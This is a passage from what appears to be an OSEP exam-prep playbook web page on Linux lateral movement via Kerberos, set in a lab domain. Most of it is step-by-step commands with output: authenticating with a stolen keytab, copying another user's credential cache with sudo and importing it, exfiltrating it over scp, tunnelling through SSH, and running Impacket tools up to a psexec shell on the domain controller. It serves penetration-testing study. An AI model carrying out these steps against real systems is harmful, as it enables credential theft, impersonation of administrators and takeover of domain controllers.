<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kinit administrator@CORP1.COM </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> /tmp/administrator.keytab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Check and view that it was created successfully</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">klist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket cache: FILE:/tmp/krb5cc_1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Default principal: administrator@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Valid starting       Expires              Service principal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:18:34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>(Optional) Renewing an expired TGT</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kinit </span><span class="token parameter variable" style="color:#36acaa">-R</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Use the ticket, below is just an example accessing an smb with the ticket and no password but it can be any other server or service</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;CORP1.COM</span><span class="token string entity" style="color:#36acaa">\a</span><span class="token string" style="color:#e3116c">dministrator&quot;</span><span class="token plain"> //DC01.CORP1.COM/C$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stealing-and-using-cached-files"><strong>Stealing and Using Cached Files</strong><a href="#stealing-and-using-cached-files" class="hash-link" aria-label="Direct link to stealing-and-using-cached-files" title="Direct link to stealing-and-using-cached-files" translate="no">​</a></h3>
<p><strong>Theory</strong> If you control a target&#x27;s Kerberos session you can immediately act as that user by reusing their live tickets, avoiding the need for a fresh TGT; alternatively, stealing or copying a user&#x27;s credential cache (ccache, typically <code>/tmp/krb5cc*</code>) and loading it locally lets you authenticate as them without their password — however, ccache files are usually owner-only readable so this typically requires privileged access (sudo/root or read access to the user&#x27;s files). In short: live shells → use existing tickets; privileged access → copy <code>/tmp/krb5cc&lt;…&gt;</code> and import it to impersonate the user.</p>
<p>Two main attack scenarios for using a victim&#x27;s Kerberos tickets:</p>
<ol>
<li class=""><strong>Compromise an active shell session</strong>: If you control a user&#x27;s&#x27; live shell, you can use their existing Kerberos tickets (no new TGT needed) and act as that user.</li>
<li class=""><strong>Steal or reuse the user&#x27;s ccache file</strong>
<ul>
<li class="">Kerberos credential caches (ccache) are usually stored under <code>/tmp</code> (e.g. <code>/tmp/krb5cc&lt;random&gt;</code>).</li>
<li class="">They&#x27;re normally only readable by the owner, so an unprivileged attacker usually can&#x27;t steal them.</li>
<li class="">With privileged access (or the ability to read the user&#x27;s files) you can copy the victim&#x27;s ccache and load it as your own to authenticate without logging in as that user.</li>
</ul>
</li>
</ol>
<p><strong>Steps</strong></p>
<ol>
<li class=""><strong>List ccache files in <code>/tmp/</code></strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-al</span><span class="token plain"> /tmp/krb5cc_*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> user                  user                 </span><span class="token number" style="color:#36acaa">1430</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:17 /tmp/krb5cc_1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> administrator@corp1.com domain users@corp1.com </span><span class="token number" style="color:#36acaa">4016</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11 /tmp/krb5cc_607000500_3aeIA5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Copy the ccache file</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">sudo</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> password </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> offsec:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">chown</span><span class="token plain"> offsec:offsec /tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-al</span><span class="token plain"> /tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> offsec offsec </span><span class="token number" style="color:#36acaa">4016</span><span class="token plain"> Jul </span><span class="token number" style="color:#36acaa">30</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:20 /tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Setting the ccache file for using it and verifying</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Cleaning memory of current tickets</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ kdestroy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ klist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">klist: No credentials cache found </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename: /tmp/krb5cc_1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Adding the ticket to memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ </span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">KRB5CCNAME</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ klist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket cache: FILE:/tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Default principal: Administrator@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Valid starting       Expires              Service principal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">Use the ticket, below is just an example for getting service tickets using our current stolen ticket</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Requesting the TGTs for services</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ kvno MSSQLSvc/DC01.corp1.com:1433</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verifying the new added tickets from Kerberos</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim:~$ klist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket cache: FILE:/tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Default principal: Administrator@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Valid starting       Expires              Service principal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">07/30/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        renew </span><span class="token keyword" style="color:#00009f">until</span><span class="token plain"> 08/06/2020 </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">:11:08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-impacket-suite-with-kerberos"><strong>Using Impacket Suite with Kerberos</strong><a href="#using-impacket-suite-with-kerberos" class="hash-link" aria-label="Direct link to using-impacket-suite-with-kerberos" title="Direct link to using-impacket-suite-with-kerberos" translate="no">​</a></h3>
<p><strong>Steps</strong></p>
<ol>
<li class="">Download the ccache file and set up the KRB5CCNAME environment variable</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kali@kali:~$ </span><span class="token function" style="color:#d73a49">scp</span><span class="token plain"> offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offsec@linuxvictim&#x27;s password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">krb5cc_minenow                            </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token number" style="color:#36acaa">4016</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">43</span><span class="token plain">.6KB/s   00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kali@kali:~$ </span><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">KRB5CCNAME</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/krb5cc_minenow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Install Kerberos client utilities</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> krb5-user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Add the DC IP to the <code>/etc/hosts</code> file</strong>, like in the example below</li>
</ol>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">127.0.0.1	localhost</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.120.40  controller</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.120.45  linuxvictim</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">192.168.120.5 CORP1.COM DC01.CORP1.COM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Commented out <code>proxy_dns</code> line in proxychains configuration file <code>/etc/proxychains.conf</code></strong></li>
</ol>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># proxychains.conf  VER 3.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Proxy DNS requests - no leak for DNS data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#proxy_dns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class="">(Optional) Setup an SSH tunnel for <code>proxychains</code> to be able to reach the internal network, discard this step if you had configured the internal tunneling otherwise, for this code example below in the <code>/etc/proxychains.conf</code> should be the line <code>socks 127.0.0.1 9050</code></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kali@kali:~$ </span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">@linuxvictim </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to Ubuntu </span><span class="token number" style="color:#36acaa">18.04</span><span class="token plain">.4 LTS </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">GNU/Linux </span><span class="token number" style="color:#36acaa">4.15</span><span class="token plain">.0-20-generic x86_64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Run the tools</strong>, below is just an example</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Listing Active Directory users</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py </span><span class="token parameter variable" style="color:#36acaa">-all</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> -no-pass -dc-ip </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC_IP</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DOMAIN</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">.COM/Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Gather SPNs for our Kerberos user</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> -no-pass -dc-ip </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DC_IP</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">DOMAIN</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">.COM/Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Getting a shell with psexec</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> -no-pass</span><br></span></code></pre></div></div></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Initial Access</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/OSEP-Playbook/docs/osep/Linux/Payloads"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Payloads</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#lateral-movement" class="table-of-contents__link toc-highlight"><strong>Lateral Movement</strong></a></li><li><a href="#configuration-files" class="table-of-contents__link toc-highlight"><strong>Configuration Files</strong></a></li><li><a href="#ssh" class="table-of-contents__link toc-highlight"><strong>SSH</strong></a></li><li><a href="#ssh-keys" class="table-of-contents__link toc-highlight"><strong>SSH Keys</strong></a></li><li><a href="#ssh-persistence" class="table-of-contents__link toc-highlight"><strong>SSH Persistence</strong></a></li><li><a href="#ssh-hijacking-with-controlmaster" class="table-of-contents__link toc-highlight"><strong>SSH Hijacking with ControlMaster</strong></a></li><li><a href="#ssh-agent-forwarding" class="table-of-contents__link toc-highlight"><strong>SSH Agent Forwarding</strong></a></li><li><a href="#ansible" class="table-of-contents__link toc-highlight"><strong>Ansible</strong></a></li><li><a href="#artifactory-jfrog" class="table-of-contents__link toc-highlight"><strong>Artifactory (JFrog)</strong></a></li><li><a href="#kerberos" class="table-of-contents__link toc-highlight"><strong>Kerberos</strong></a></li><li><a href="#stealing-keytab-files" class="table-of-contents__link toc-highlight"><strong>Stealing Keytab Files</strong></a></li><li><a href="#stealing-and-using-cached-files" class="table-of-contents__link toc-highlight"><strong>Stealing and Using Cached Files</strong></a></li><li><a href="#using-impacket-suite-with-kerberos" class="table-of-contents__link toc-highlight"><strong>Using Impacket Suite with Kerberos</strong></a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>